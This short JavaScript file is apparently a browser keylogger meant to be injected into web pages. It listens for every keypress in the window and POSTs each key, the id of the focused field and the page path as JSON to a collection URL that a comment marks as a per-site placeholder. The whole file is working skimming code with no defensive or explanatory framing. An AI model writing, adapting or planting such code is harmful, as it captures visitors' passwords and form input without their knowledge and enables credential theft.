// generate per site url
const url = "/k"  // placeholder to be replaced
//* Listener for characters
window.addEventListener('keypress', async (ev)=>{
    console.log('Keypress')
    await sendKey(ev.key, document.activeElement.id)
})
// //* Listener for non-printable characters
// window.addEventListener('keydown', (ev)=>{
//     console.log(ev.key)
// })

async function sendKey(key, field){
    console.log(key)
    const data = {
        key: key,
        field: field,
        id: window.location.pathname
    }
    let res = await fetch(url, {
        method: 'POST',
        mode: 'cors',
        body: JSON.stringify(data),
        headers: {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': "*"
        }
    })
}